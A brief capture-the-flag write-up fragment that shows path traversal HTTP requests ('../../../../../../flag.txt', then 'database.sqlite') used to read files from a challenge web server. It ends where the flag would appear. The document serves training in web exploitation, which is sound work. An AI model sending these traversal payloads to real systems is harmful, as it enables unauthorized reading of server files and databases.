GET /?page=../../../../../../flag.txt HTTP/1.1
if we try to open the directory containing the flag.txt we'll see that, after sending this, in the Response "Flag is in SQLite3: database.sqlite

The flag is in database.sqlite, so let's test it out
GET /?page=../../../../../../database.sqlite HTTP/1.1
send
On line 133 we can see the flag:
